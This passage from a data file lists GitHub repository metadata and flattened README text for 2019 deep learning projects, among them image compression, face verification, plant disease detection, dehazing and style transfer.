naity,citeseq_autoencoder,n/a,Integrative analysis of single cell multi omics data using deeplearning The accompanying notebooks for my blog post Integrative analysis of single cell multi omics data using deeplearning https medium com yuantian integrative analysis of single cell multi omics data using deep learning 66a61a3448c5 The data can be downloaded at https www dropbox com sh opxrude3s994lk8 AAAiWrZzFViksxKpYomlwqhEa dl 0 To run the clustering notebook you will need to have R and the Seurat package installed by typing install packages Seurat library Seurat To run the autoencoder notebooks you will need to have Python 3 6 or later and install Pytorch v1 and the fastai library by typing conda install c pytorch c fastai fastai To use Pip install please first install Pytorch following the instructions on https pytorch org and then install fastai by typing pip install fastai,2019-09-14T04:50:26Z,2019-10-16T13:15:02Z,Jupyter Notebook,naity,User,1,2,2,12,master,naity,1,0,0,0,0,0,0
LichengXiao2017,deep-image-compression,n/a,Project Demo Slides https bit ly deepimagecompressionslides Package https pypi org project deep image compression Deep Image Compression Extreme Image Compression Using Deep Learning image of pipline https github com LichengXiao2017 deep image compression blob master deepimagecompression static img pipeline png Deep Image Compression is an end to end tool for extreme image compression using deep learning It outperforms JEPG HEIC state of the art traditional image compression method derived from H 265 available in iPhone and Mac and Balle s approach in 2018 state of the art open source deep learning approach proposed by Balle et al in Variational Image Compression with a Scale Hyperprior The baseline model and algorithm Balle2018 was cloned from the Data compression in TensorFlow https github com tensorflow compression repo in September 2019 In my approach I changed the training dataset and modified the model structure as is shown in the following figure image of model structure modification https github com LichengXiao2017 deep image compression blob master deepimagecompression static img modelimprovement png The directory structure of this repo is the following deep image compression contains all the source code bin contains all executable scripts model contains model checkpoints static contains images used in the README md tests contains all the unit tests data contains data for training validation and unit test configs contains config files for hyperparameters during training and evaluation docs contains documentations examples contains jupyter notebook examples of the workflow Setup Installation First clone this github repo git clone https github com LichengXiao2017 deep image compression git cd deep image compression Then install deep image compression package You can install it within venv or with user option python3 m pip install deep image compression user Requisites All the following requisites will be automatically installed when you install the deep image compression package 1 tensorflow gpu 1 15 0 rc1 2 absl py 0 8 0 3 opencv python 4 1 1 26 4 argparse 1 4 0 5 glob3 0 0 1 6 tensorflowcompression 1 2 7 numpy 1 16 4 Environment setup It s highly recommended that workstation running this repo to have at least 1 GPU The repo has been tested on Nvidia GTX 1070 8GB memory The repo currently support only single GPU It s suggested that you specify the GPU you are going to use before running the scripts For example if you want to use the first GPU type the following command in terminal export CUDAVISIBLEDEVICES 0 Other processes running on this GPU might cause problem so please run this repo on a vacant GPU Steps to run Step1 Configuration Configurations are not combined into single config file yet Here are a list of scripts and variables that need configuration before running 1 bin dataingestion DATAPATH 2 bin dataprocessing IMAGEPATH 3 bin modeltrainingballe2018 TRAINDATAPATH MODELPATH LAMBDA NUMFILTERS MAXTRAINSTEPS 4 bin modeltrainingmyapproach TRAINDATAPATH MODELPATH LAMBDA NUMFILTERS MAXTRAINSTEPS MAINLEARNINGRATE AUXLEARNINGRATE TRAINBATCHSIZE 5 bin modelinferencecompressballe2018 TESTDATAPATH MODELPATH NUMFILTERS 6 bin modelinferencecompressmyapproach TESTDATAPATH MODELPATH NUMFILTERS 7 bin modelinferencedecompressmyapproach TESTDATAPATH MODELPATH NUMFILTERS 8 bin modelinferencedecompressmyapproach TESTDATAPATH MODELPATH NUMFILTERS 9 bin renamereconstructedimages RECONSTRUCTEDIMAGEPATH 10 bin modelanalysissingleimage ORIGINALIMAGEPATH COMPRESSEDIMAGEPATH RECONSTRUCTEDIMAGEPATH 11 bin modelanalysisbatchimages ORIGINALIMAGEFOLDERPATH COMPRESSEDIMAGEFOLDERPATH RECONSTRUCTEDIMAGEFOLDERPATH In the future these configurations will be combined into single config file under configs Step2 Prepare and Preprocess Download dataset Download and unzip the dataset you want to use for training by running bin dataingestion The datasets used in this project is The CLIC dataset https www compression cc You can also modify dataingestion and use your own training dataset Convert color domain to RGB This repo currently support only RGB color domain Convert the dataset to RGB domain by running bin dataprocessing Step3 Train model To train the baseline Balle2018 model run bin modeltrainingballe2018 To train my approach model run bin modeltrainingmyapproach Step4 Inference model Compression will convert a png file to png tfci file To compress image using Balle2018 model run bin modelinferencecompressballe2018 To compress image using my approach model run bin modelinferencecompressmyapproach Decompression will convert a png tfci file to png tfci png file To decompress image using Balle2018 model run bin modelinferencedecompressballe2018 To decompress image using my approach model run bin modelinferencedecompressmyapproach Step5 Evaluate model rename decompressed images To maintain the same order of files when evaluating a list of images you need to rename png tfci png files into png files before evaluation run bin renamereconstructedimages evaluate single image bin modelanalysissingleimage evaluate a list images bin modelanalysisbatchimages Analysis Final result The following graphs show that my approach achieved lower bpp bit per pixel with similar MSE mean square error during training image of MSE comparison https github com LichengXiao2017 deep image compression blob master deepimagecompression static img MSEcomparison png image of bpp comparison https github com LichengXiao2017 deep image compression blob master deepimagecompression static img bppcomparison png Note 1 The metrics in the table is averaged on 24 images from Kodak dataset 2 The encoding and decoding time can be greatly reduced by pre loading the model image of results https github com LichengXiao2017 deep image compression blob master deepimagecompression static img resulttable png,2019-09-12T00:30:48Z,2019-10-24T18:35:30Z,Python,LichengXiao2017,User,2,2,1,13,master,LichengXiao2017,1,3,3,0,0,1,7
ahedayat,FastAP,n/a,FastAP,2019-08-16T10:15:34Z,2019-11-22T05:29:47Z,Python,ahedayat,User,1,2,0,1,master,ahedayat,1,0,0,0,0,0,0
DaneyAlex5,Live-Face-Verification-Using-Deep-Learning,face-detection#face-verification#facenet#live-face-verification#mtcnn#webcam-based-face-verification,Live Face Verification Using Deep Learning Face Detection and landmark detection It is done using Multi task Cascaded Convolutional Networks MTCNN model Used a pretrained model of MTCNN to detect face to find the bounding box and landmark detection Reference https arxiv org pdf 1604 02878 pdf https github com ipazc mtcnn Face Verification The face Recognition is done using Facenet model Used a pretrained facenet model to compare the captured image with images in database to verify person s face Reference https arxiv org pdf 1503 03832 pdf 1 MTCNN Pretrained Model Follow link https github com ipazc mtcnn 2 FaceNet Pretrained Model https drive google com file d 0B5MzpY9kBtDVZ2RpVDYwWmxoSUk Dependency 1 Python 3 6 2 tensorflow r1 12 or above 3 OpenCV 4 1 1 or above How to Run the Code 1 Download and extract the Faceverification zip code into a folder 2 Download the pretrained model from the link given and place the files in the extracted folder in step 1 3 Input some images of person inside the database folder 4 Now execute the LiveFaceVerification py script Execution 1 The image captured can be seen inside captured folder 2 The detected face with bounding box cropped part of image and land mark detected images can be seen inside folder check Note 1 Use the port number for the webcam according to Device Configration of your sytem Edit FaceRec py Line 9 camera cv2 VideoCapture 0 2 Use webcam with resolution greater than 640x480 for better accuracy,2019-08-21T08:35:44Z,2019-11-13T05:04:22Z,Python,DaneyAlex5,User,1,2,0,5,master,DaneyAlex5,1,0,0,0,0,0,0
LxMera,Deep-Learning---denoising-rs-fMRI,n/a,Deep learning architectures for the classification of independent components of rs fMRI Deep Learning denoising rs fMRI Leonel Mera Jimnez and John F Ochoa Gmez Grupo de investigacin en Bioinstrumentacin e Ingeniera Clnica Facultad de Ingeniera Universidad de Antioquia Medelln Colombia At present functional magnetic resonance imaging at rest rs fMRI is one of the tools of greatest interest in neurosciences due to the advantages presented over other methodologies for acquiring brain activity However there is a long way to go in terms of the artifacts cleaning necessary to increase the signal to noise ratio in the images Therefore to give a contribution to the new cleaning methods on rs fMRI images in this investigation four deep learning network architectures for the classification of neuronal activity and noise are studied using 27 temporal spectrum characteristics of the independent components of rs fMRI images of two groups of healthy subjects The study allowed to find four architectures with classification accuracy close to 97 and the number of characteristics necessary for the identification of the components associated to noise and neuronal activity were reduced to five these being the low frequency fluctuation amplitude ALFF in the bands from 0 01 to 0 027 Hz and from 0 027 to 0 073 Hz the fractional low frequency amplitude in the same 2 bands and a jump amplitude function,2019-09-14T13:31:27Z,2019-12-11T07:47:49Z,Jupyter Notebook,LxMera,User,1,2,0,56,master,LxMera,1,0,0,0,0,0,0
sohailahmedkhan173,Phishing-Websites-Classification-using-Deep-Learning,cybersecurity#decision-trees#deep-learning#knearest-neighbor-algorithm#machine-learning#neural-network#phishing-detection#random-forest#support-vector-machines,Phishing Websites Classification using Deep Learning A detailed comparison of performance scores achieved by Machine Learning and Deep Learning algorithms on 3 different Phishing datasets 3 different feature selection and 2 different dimensionality reduction techniques are used for comparison More than 97 accuracy achieved using the proposed technique,2019-09-17T13:22:15Z,2019-11-27T02:52:52Z,Jupyter Notebook,sohailahmedkhan173,User,1,2,0,3,master,sohailahmedkhan173,1,0,0,0,0,0,0
AT1693,Plant-Disease-detection-using-Deep-Learning,n/a,Deep Learning for the plant disease detection This is the source code of the experiment described in chapter Deep Learning for Plant Diseases Detection and Saliency Map Visualisation https link springer com chapter 10 1007 978 3 319 90403 06 in a book Human and Machine Learning 2018 Training and evaluating state of the art deep architectures for plant disease classification task using pyTorch Models are trained on the preprocessed dataset which can be downloaded here https drive google com open id 0BvoCy5O5sXMTFByemhpZllYREU Dataset is consisted of 38 disease classes from PlantVillage https plantvillage org dataset and 1 background class from Stanford s open dataset of background images DAGS http dags stanford edu projects scenedataset html 80 of the dataset is used for training and 20 for validation Usage 1 Train all the models with train py and store the evaluation stats in stats csv python3 train py 2 Plot the models results for every archetecture based on the stored stats with plot py python3 plot py Results The models on the graph were retrained on final fully connected layers only shallow for the entire set of parameters deep or from its initialized state from scratch Model Training type Training time h Accuracy Top 1 AlexNet shallow 0 87 0 9415 AlexNet from scratch 1 05 0 9578 AlexNet deep 1 05 0 9924 DenseNet169 shallow 1 57 0 9653 DenseNet169 from scratch 3 16 0 9886 DenseNet169 deep 3 16 0 9972 Inceptionv3 shallow 3 63 0 9153 Inceptionv3 from scratch 5 91 0 9743 Inceptionv3 deep 5 64 0 9976 ResNet34 shallow 1 13 0 9475 ResNet34 from scratch 1 88 0 9848 ResNet34 deep 1 88 0 9967 Squeezenet11 shallow 0 85 0 9626 Squeezenet11 from scratch 1 05 0 9249 Squeezenet11 deep 2 10 0 992 VGG13 shallow 1 49 0 9223 VGG13 from scratch 3 55 0 9795 VGG13 deep 3 55 0 9949 NOTE All the others results are stored in stats csv https github com MarkoArsenovic DeepLearningPlantDiseases blob master Results stats csv Graph Results https github com MarkoArsenovic DeepLearningPlantDiseases blob master Results results png Results Visualization Experiments Contributor Brahimi Mohamed mailto mbrahimi esi dz Prerequisites Train the new model or download pretrained models on 10 classes of Tomato from PlantVillage dataset AlexNet https drive google com open id 1Ms1Ri5DUyD4uYZX5tG2hrN2hUH6XbQS or VGG13 https drive google com open id 1f0nPNRfL42fJA8tF5JoKUKv0Xr98p8 P Occlusion Experiment Occlusion experiments for producing the heat maps that show visually the influence of each region on the classification Usage Produce the heat map and plot with occlusion py and store the visualizations in outputdir python3 occlusion py path to dataset path to outputdir modelname pkl path to image diseasename Visualization Examples on AlexNet Early Blight https raw githubusercontent com MarkoArsenovic DeepLearningPlantDiseases master Scripts visualization output earlyblight earlyblight png Early blight original size 80 stride 10 size 100 stride 10 Late Blight https raw githubusercontent com MarkoArsenovic DeepLearningPlantDiseases master Scripts visualization output lateblight lateblight png Late blight original size 80 stride 10 size 100 stride 10 Septoria Leaf Spot https raw githubusercontent com MarkoArsenovic DeepLearningPlantDiseases master Scripts visualization output septorialeafspot septorialeafspot png Septoria leaf spot original size 50 stride 10 size 100 stride 10 Saliency Map Experiment Saliency map is an analytical method that allows to estimate theimportance of each pixel using only one forward and one backward pass through the network Usage Produce the visualization and plot with saliency py and store the visualizations in outputdir python3 occlusion py path to model path to dataset path to image classname Visualization Examples on VGG13 Early Blight https raw githubusercontent com MarkoArsenovic DeepLearningPlantDiseases master Scripts visualization outputsaliency early 20blight earlyblight jpg Early blight Original Naive backpropagation Guided backpropagation Late Blight https raw githubusercontent com MarkoArsenovic DeepLearningPlantDiseases master Scripts visualization outputsaliency late 20blight lateblight jpg Late blight Original Naive backpropagation Guided backpropagation Septoria Leaf Spot https raw githubusercontent com MarkoArsenovic DeepLearningPlantDiseases master Scripts visualization outputsaliency septoria septoria jpg Septoria leaf spot Original Naive backpropagation Guided backpropagation,2019-08-29T11:23:10Z,2019-09-02T10:43:01Z,Python,AT1693,User,1,2,0,19,master,MarkoArsenovic,1,0,0,0,0,0,0
oliverwangx,Emotion-Recognition-based-on-Deep-Learning,n/a,Emotion Recognition based on Deep Learning This is the undergraduate capstone project Problem Statement Emotion Recognition or specifically Facial Expression Recognition FER has been one of the most prevalent topics in the application of deep learning As a powerful method of monitering human emotion FER model can be unilized in an automotive in order to detecting driver s negative emotions and thus increase driving safety Typically a FER model should be able to recognize seven emotions happy sad angry surprise disgust fear and neutral Design Description The design uses Multi task Convolutional Neural Network MTCNN to detect and crop face region from background After the step a homography function is employed to align all the faces based on the landmarks returned by MTCNN Then the preprocessed data set is expanded by data augmentation methods e g changing lightness and contrast adding Gaussian flur or noise etc With the augmented data a pre trained model of Inception Residual Network V2 is further trained and a final model is obtained image https github com oliverwangx Emotion Recognition based on Deep Learning blob master EmotionRecognization jpg,2019-09-07T20:56:54Z,2019-09-16T05:27:09Z,Python,oliverwangx,User,1,2,0,0,master,,0,0,0,0,0,0,0
arnaghosh,DeepMouse,n/a,Deep Mouse The code base for deep neural networks models of mouse visual cortex Requirements PyTorch 1 1 0 Todo Coding up functions needed to read from the CatCam data Training the CPC model on the CatCam data Useful links starters ConvLSTM model in PyTorch implementation https github com ndrplz ConvLSTMpytorch Convolutional GRU in PyTorch implementation http jkimmel net pytorchconvgru Allen institute OpenScope http observatory brain map org visualcoding,2019-09-11T21:41:12Z,2019-10-25T21:26:52Z,Python,arnaghosh,User,3,2,0,38,master,arnaghosh#ShahabBakht,2,0,0,0,0,0,0
xrenaa,Human-Motion-Analysis-with-Deep-Metric-Learning,dataset#deep-metric-learning#eccv#eccv-2018#human-motion-analysis#pytorch#skeleton,Human Motion Analysis with Deep Metric Learning pytorch implement of this paper https arxiv org abs 1807 11176 ECCV 2018 Implement by Tim Ren Harrison Huang To do x MMD NCA Loss Layer Normalization LSTM x Self Attention x Training Improve Dataloader Instead of a Bi direction Layer Normalization LSTM we use a non normalizaiton bi direction GRU version And for now the dataloader may use a large memory of your cpu If there is any problem make the parameter numMMDNCAGroups of MMDNCADataset smaller Dataset I clean the dance dataset of https arxiv org abs 1801 07388 The cleaned dataset is provided here https drive google com file d 17mUfFjPCZFyZaEyM7NwpLEptg3Vo9DuU view usp sharing The dataset contains 16 classes of dance It contain 51858 sequence The key of the json file is 0 1 15 Each key contains 50 2 17 pose 2 is channel 17 is pose coordinates as coco format And each pose is normalized Usage cd Human Motion Analysis with Deep Metric Learning mkdir log mkdir dataset Download the dataset I provided above put it in the folder dataset It is suggested to split it by yourself for the dataset is too large Note if you split the data you need to change line 247 in train py And run python train py Result Alt text image visualresult png Contact If have any question feel free to connect me by email xrenaa1998 gmail com,2019-09-19T04:29:14Z,2019-12-09T06:21:10Z,Python,xrenaa,User,2,2,0,19,master,xrenaa,1,0,0,1,0,0,0
fruittree,CSC496_2019F,n/a,CSC4962019F Deep learning in computer vision Instructor Bei Xiao American University Location DMTI Room 110 Time Monday Thursday 2 30pm 3 45pm Office DMTI Room 204 First Class August 26th Office hour check syllabus General Information Course Objective This course provides an overview of deep neural network AKA deep learning and related methods with applications in computer vision First we will overview continue after CSC 476 some fundamental topics in computer vision such as image formation camera models color multiscale pyramids and statistical modeling of images Second we will introduce basic machine learning methods and neural network architectures Finally we dive into a variety of deep learning based applications in computer vision Students learn to implement train and debug off the shelf and their own neural networks and gain a detailed understanding of the cutting edge research in computer vision Topics include visual data representation mid level vision image parsing image classification and synthesis with architectures such as convolutional neural networks CNNs recurrent neural networks RNNs generative advisory networks GANs and Variational Autoencoders VAEs Perquisites 1 Proficiency in Python If you have plenty of coding experieces with MATLAB C is fine too 2 College Calculus 3 Basic probability statistics andlinear algebra Textbooks and references 1 Required R Szeliski Computer Vision Algorithms and Applications available at http szeliski org Book 2 Required I Goodfellow Deep learning http www deeplearningbook org Other references especially useful if you havent taken CSC476 3 Linear Algebra 3 1 Stanford CS229 review http cs229 stanford edu section cs229 linalg pdf 3 2 Immersive Math linear algebra http immersivemath com ila index html 4 Python Numpy tutorials https sites engineering ucsb edu shell che210d numpy pdf 5 Probability and statistics seeing theory https seeing theory brown edu 6 Tensorflow and machine learning https www tensorflow org tutorials keras Course Policy Attendence policy Missing one class without written request will result in 2 reduction in attendance score However students can be absent for class and arrange for make up exams if they have written proof of religious holidays and documented disabilities Athlete who would miss class due to sports events must send written form to instructor at least 24 hours before the class Homework late policy Projects are due 11 59pm of the due date You usually have two weeks to finish the assigned project We do not accept late submissions for this course Homework is typically due 11 59pm The submission deadline has a 24 hour soft cut off after midnight submissions are penalized 5 per hour late round up to the next hour automated by Blackboard So you turned it in 2 59am You will get 3 hours penalty with a 15 point reduction There is no negotiation about this Exam Policy Mid term exam will be announced at least one week ahead of time If you have special needs you need to notify me at least 7 days before to arrange the test be performed off class in the exam center Missed exams and quizzes cannot be made up Email Policy You can email me if you have questions regarding clarification of lectures and homeworks But you must write to me at least 48 hours to expect an answer No homework is accepted via Email Everything must be uploaded onto Blackboard Elaborate homework related questions are restricted to office hours Grading 65 homework projects 10 mid term exam 15 Final project 5 in class quiz 5 attendances We sometimes offer extra credits for additional features in homework and projects Course Schedule Date Lecture Topic Course Materials Assignments Mon August 26 Lecture 1 Course Introduction Szeliski 1 Goodfellow 2 Linear Algebra review Exercise 1 set up virtual box Numpy primer jupyter notebook tutorial Thursday August 29 Lecture 2 A simple visual system Blockworld a simple vision system VirtualBox Tutorial Thursday September 5 Lecture 3 pinhoel camera Cameras Homework 1 simple vision system Monday September 9 Lecture 4 Lens Filtering SignalProcessing Thursday September 13 Lecture 5 Linear Filtering 2D convolution Homework 2 Numpy Scipy Exercises Monday September 16 Lecture 6 Signal Processing 2 Fourier transform Szeliski Chapter 3 2 3 3 Monday September 23 Lecture 7 Convolution in Fourier Domain Homework 3 Pin hole camera Monday September 26 Lecture 8 Temporal Filters TemporalProcessing Homework 4 Motion Magnification,2019-08-23T01:30:34Z,2019-09-26T15:25:06Z,n/a,fruittree,User,2,2,1,53,master,fruittree,1,0,0,1,0,1,0
tusharsircar95,All-In-One-Image-Dehazing-Tensorflow,n/a,All In One Image Dehazing Tensorflow Tensorflow implementation of an extremely light weight All In One Image Dehazing AOD network as described here An explanation and walk through is provided here Training Validation Data has been downloaded from here This includes 1500 images from the NYU2 dataset and 27K synthetically hazed images Image size was set to 480x640 and were normalized to 0 1 90 of the data was kept for training and the rest 10 for validation Adam optimizer with learning rate of 0 0001 was used Gradient norm was clipped at 0 1 Weights were initialized with a Gaussian distribution Mean 0 0 STD 0 02 and a weight decay of 0 0001 was used 8 epoch were run although significant improvement was not observed after 3 epochs Loss function was MSE Train MSE and Validation MSE were about 0 015 Evaluation Model checkpoint files have been included in the models folder To evaluate add jpeg or jpg images in the testimages folder and run the Evaluation section in the Python notebook Dehazed images are saved to the dehazedtestimages folder Results Original Hazy Image Dehazed Image References InProceedingsLi2017ICCV author Li Boyi and Peng Xiulian and Wang Zhangyang and Xu Jizheng and Feng Dan title AOD Net All In One Dehazing Network booktitle The IEEE International Conference on Computer Vision ICCV month Oct year 2017 https github com TheFairBear PyTorch Image Dehazing PyTorch Implementation,2019-08-12T10:09:00Z,2019-09-26T02:27:39Z,Jupyter Notebook,tusharsircar95,User,1,2,1,4,master,tusharsircar95,1,0,0,0,0,0,0
viditvarshney,AWS-DeepRacer,aws#aws-s3#awsdeepracer,aws https user images githubusercontent com 34159717 64080396 5d011180 cd11 11e9 8320 99a5619af9ce png AWS DeepRacer AWS DeepRacer is the fastest way to get rolling with machine learning literally Get hands on with a fully autonomous 1 18th scale race car driven by reinforcement learning 3D racing simulator and global racing league Here in this repo i am sharing my progress with the DeepRacer My Current Rank in September Leaderboard is 42 This is my first Step in Machine Learning after completing some valuable courses My Best Lap time is 15 014 sec and my best rank is Till Now is 42 I Learned So much from this practicle Work Main model for which i worked a lot is Model7 https github com viditvarshney AWS DeepRacer blob master Models Model7 reward py Tech used Machine Learning Reinforcement learning Python AWS DeepRacer https media giphy com media Y087U54xBmbgve0G5h giphy gif Contact Let s Become Friend Twitter https twitter com varshneyvidit Github https github com viditvarshney Facebook https www facebook com vidit varshney222 Linkedin https www linkedin com in vidit varshney,2019-09-01T16:46:31Z,2019-10-10T14:19:44Z,Python,viditvarshney,User,1,2,0,7,master,viditvarshney,1,0,0,0,0,0,0
NambiarSidharth,FrozenLake_QLearning,n/a,,2019-08-24T13:32:55Z,2019-09-09T05:00:05Z,Python,NambiarSidharth,User,1,2,0,1,master,NambiarSidharth,1,0,0,0,0,0,0
sherrycattt,bb_dl.pytorch,n/a,Barzilai Borwein based Adaptive Learning Rate for Deep Learning PyTorch implementation of BB learning rate proposed by the following paper Barzilai Borwein based Adaptive Learning Rate for Deep Learning https doi org 10 1016 j patrec 2019 08 029 A BarzilaiBorwein based method for adaptive learning rate of training DNNs The method is highly insensitive to initial learning rate which greatly reduces computational effort The method has its advantage over others on learning speed and generalization performance Convergence guarantee of the method for training DNNs Files bbdl py the source code for BB learning rate demo py an example showing how to use BB for training NNs Usage You can use BB just like any other PyTorch optimizers python3 optimizer BB model parameters lr 1e 1 steps 400 beta 0 01 maxlr 10 0 minlr 1e 1 Dependencies python 3 6 torch 1 2 0 torchvision 0 2 1 Other versions might also work Citation If you use BB for your research please cite text Articleliang2019bbdl Title Barzilai Borwein Based Adaptive Learning Rate for Deep Learning Author Liang Jinxiu and Xu Yong and Bao Chenglong and Quan Yuhui and Ji Hui Journal Pattern Recognition Letters Year 2019 Pages 197 203 Volume 128,2019-09-19T08:14:45Z,2019-09-20T06:34:16Z,Python,sherrycattt,User,1,2,0,2,master,sherrycattt,1,0,0,0,0,0,0
dkurt,dl_tradeoff,accuracy#computer-vision#deep-learning#efficiency#performance,Deep learning network accuracy efficiency tradeoff diagrams This repository contains data and evaluation scripts for plots from https dkurt github io dltradeoff which represent comparison of different computer vision deep learning networks by accuracy and efficiency This kind of diagrams can help to choose pre trained networks for your problem or decide which topology backbone is more suitable for training NOTE Explore datasets that were used for evaluation Some of the models can be trained for specific use cases and may perform better for some of the scenarios To put as much networks as possible to a single chart we had to evaluate them on the same data to make metrics comparable Image previews will be added later How can I add a new network There are two sources which are used for evaluation Open Mozel Zoo https github com opencv openmodelzoo which is more preferable and custom models extra models Choose one of them for contribution Found a bug in metric measurement or have concerns about it Open an issue https github com dkurt dltradeoff issues or contribute changes by a pull request https github com dkurt dltradeoff pulls Branches strategy master https github com dkurt dltradeoff tree master release versions Is used for rendering gh pages https github com dkurt dltradeoff tree gh pages development branch choose one for new pull requests Local experiments If you want to try to reproduce the data follow these steps 1 Clone Open Model Zoo bash git clone https github com opencv openmodelzoo git remote add dkurt https github com dkurt openmodelzoo git fetch dkurt pyopenmodelzoov2 git checkout pyopenmodelzoov2 export PYTHONPATH path to openmodelzoo tools downloader PYTHONPATH 2 Install OpenCV at least of version 4 1 2 or starts with OpenVINO R3 3 Download task specific dataset COCO for object detection http cocodataset org download ImageNet for classification http www image net org challenges LSVRC 2012 nonpub downloads FDDB for face detection http vis www cs umass edu fddb 4 optional for object detection Install COCO validation pipeline bash git clone https github com cocodataset cocoapi cd cocoapi PythonAPI python3 setup py buildext inplace rm rf build export PYTHONPATH path to cocoapi PythonAPI PYTHONPATH,2019-09-08T16:11:14Z,2019-12-05T23:57:56Z,HTML,dkurt,User,1,2,0,9,gh-pages,dkurt,1,0,0,0,0,0,3
Intellencia,NeuralArt,n/a,Neural Art Deep Learning for Just as painting styles Inspired by Coursera Deep Learning Art Neural Style Transfer This tutorial can help you to use Neural Style transfer as described in A Neural Algorithm of Artistic Style https arxiv org pdf 1508 06576v2 pdf by Leon A Gatys Alexander S Ecker Matthias Bethge It allows to create a new image your picture inspired by another such as a famous work of art We ll implement the neural style transfer algorithm by using the Tensroflow library How to use Parameters There are two images to send in the input of the neural network the content image 1 Content image images Content jpg raw true Content image the style image 2 Style image images Style jpg raw true Style image The Bridges of Amsterdam Leonid Afremov https afremov com In the output we get the generated image merging the content image 1 with the style of 2 Result image output Result png raw true Result image The two images must have the same shape but this one could be modify as other parameters in the nstutils py nstutils py file class CONFIG IMAGEWIDTH 774 You can modify the width of the two input images IMAGEHEIGHT 1145 You can modify the height of the two input images COLORCHANNELS 3 NOISERATIO 0 6 MEANS np array 123 68 116 779 103 939 reshape 1 1 1 3 VGGMODEL pretrained model imagenet vgg verydeep 19 mat Pick the VGG 19 layer model by from the paper Very Deep Convolutional Networks for Large Scale Image Recognition STYLEIMAGE images Style jpg Style image to use CONTENTIMAGE images Content jpg Content image to use OUTPUTDIR output Output directory VGG 19 layer Note that in order to use this algorithm you must download the pretrained model VGG 19 layer https www kaggle com teksab imagenetvggverydeep19mat imagenet vgg verydeep 19 mat This technique is called the transfer learning This model was trained on ImageNet and allow us to extract the feature maps to describe the content of our images Put the file in a new folder pretrained model Dependencies You ll need the following packages to run successfully the main py main py file TensorFlow https www tensorflow org install NumPy https github com numpy numpy blob master INSTALL rst txt SciPy https github com scipy scipy blob master INSTALL rst txt Pillow https pillow readthedocs io en 3 3 x installation html installation License GNU General Public License v3 0,2019-08-19T13:23:10Z,2019-10-28T09:36:01Z,Python,Intellencia,User,1,2,1,33,master,Intellencia,1,0,0,0,0,0,1
antonioterpin,wavelet_ml,n/a,Wavelet preprocessing for deep learning applications An effective approach to steel defect detection Quality control is a main issue in any industry The need of assuring a human like evaluation during products quality control has resulted in an active research aiming to develop an automatic defect detection scheme In this paper an effective solution to defect detection on steel surfaces from images is presented Firstly a preprocessing step aiming to spot plausible defective areas is discussed Lastly the classification of these proposed regions is made Hence a proper segmentation scheme is described Incidentally a novel usage of the dilation factor in convolutional layers is introduced providing an effective approach to classifying images of different sizes,2019-08-12T10:43:40Z,2019-11-06T17:18:41Z,TeX,antonioterpin,User,1,2,0,134,master,antonioterpin#claudioverardo,2,0,0,0,0,0,0
aivclab,dlcourse,n/a,dlcourse Resources for Deep Learning for Visual Recognition https kursuskatalog au dk da course 93556 Deep Learning for Visual Recognition,2019-08-25T11:22:17Z,2019-11-26T17:42:03Z,Jupyter Notebook,aivclab,Organization,3,2,0,37,master,klaverhenrik,1,0,0,0,0,0,0
ZekiFayes,IUDLM,n/a,Image Understanding with Deep Learning and Mathematics IUDLM This is to understand images with deep learning approaches As IUDLM tells it involves Image Understanding object detection localization recognition segmentation understanding Deep Learning CNN RNN RL and Mathematics Optimization Statistics Our goal is to combine deep learning and object detection For the overview of framework we refer to Object Detection with Deep Learning A Review Zhong Qiu Zhao https arxiv org abs 1807 05511 We will borrow our machine learning algorithms and Cameo architecture We extract the core idea from the review Recent Advances in Deep Learning for Object Detection Xiongwei Wu https arxiv org abs 1908 03673v1 Then we summarize the design guideline as a manual based on the reference and experience We can build the computational model by constructing the blocks Deep Learning for Computer Vision https github com ZekiFayes IUDLM blob master DL4CV png Layered Software Design https github com ZekiFayes IUDLM blob master System 20Design png Object Detection Framework https github com ZekiFayes IUDLM blob master Object 20Detection png The whole system is listed in the folder DL4CV https github com ZekiFayes IUDLM tree master DL4CV It consists of 1 Deep Learning keras tensorflow 1 1 iudlm dataloader 1 2 iudlm IO 1 3 iudlm model 1 4 iudlm preprocessor 1 5 iudlm utils 2 Computer Vision OpenCV 2 1 videoanalysis CaptureManager 2 2 videoanalysis WindowManager 2 3 3 Real Time Application 3 1 Cameo 3 2 Deep Learning 1 Neural Network 2 Probabilistic Graphical Model 3 Solver Image Understanding 1 Object Detection 2 Object Recognition 3 Segmentation 4 Localization Mathematics 1 Optimization 2 Statistics The pipeline of theory Object Detection 1 Region proposal based R CNN 2 Regression Classification based YOLO The pipeline of implementation Object Oriented 1 Prototype 2 Optimization 3 Established 4 Standard Object Oriented 1 Class 2 Abstraction Programming Language and Libraries 1 Python PyCharm 2 Tensorflow 3 OpenCV 4 Numpy 5 Pandas 6 Matplotlib 7 Sklearn 8 Scipy 9 MATLAB 10 C class ClassName object def init self variables def method self operations Day 1 Reference Selective Search for Object Recognition J R R Uijlings http huppelen nl publications selectiveSearchDraft pdf Problem Generating possible object locations for use in object recognition Solution Selective Search Day 2 Reference Efficient Graph Based Image Segmentation Pedro F Felzenszwalb http people cs uchicago edu pff papers seg ijcv pdf Problem segmenting an image into regions Solution Graph Based Image Segmentation Reference Rich feature hierarchies for accurate object detection and semantic segmentation Ross Girshick https www cv foundation org openaccess contentcvpr2014 papers GirshickRichFeatureHierarchies2014CVPRpaper pdf Framework R CNN Regions with CNN features Modules 1 Region proposals 2 Feature extraction 3 Classification Here we are focused on Region proposals We have built the other modules Once we can finish the region proposals module we can build R CNN and its variants Day 3 We refer to source code mentioned in Efficient Graph Based Image Segmentation We will write the prototpye using python Day 4 We build a rough prototpye using Python Day 5 We build the prototype using object oriented programming Reference Lifelong Machine Learning Systems Beyond Learning Algorithms Daniel L Silver The goal is to sequentially retain learned knowledge and to selectively transfer that knowledge when learning a new task so as to develop more accurate hypotheses or policies Day 6 We went over the Deep learning notes cmu Deep learaning http www cs cmu edu bhiksha courses deeplearning Spring 2019 www This is to introduce Deep learning with neural network Rich feature hierarchies for accurate object detection and semantic segmentation Ross Girshick http www rossgirshick info proposes R CNN Regions with CNN features Day 7 Reference Matching Networks for One Shot Learning Oriol Vinyals consists of learning a class from a single labelled example Day 8 We review Faster RCNN and write down a summary We focus on two Modules Region Proposal Network RPN and Region of Interest ROI Pooling We use keras to build a MiniVGGNet as the base network Reference SCARLET NAS Bridging the gap Between Scalability and Fairness in Neural Architecture Search Xiangxiang Chu proposes an Architeture search approach to bridge the gap between Scalability and Fairness with a linearly transformation The problem can be converted into a multi objective optimization problem Mathematically we can find the optimal architecture by sovling the optimization problem Day 9 We extract the core idea from the review Recent Advances in Deep Learning for Object Detection Xiongwei Wu https arxiv org abs 1908 03673v1 Then we summarize the design guideline as a manual based on the reference and experience We can 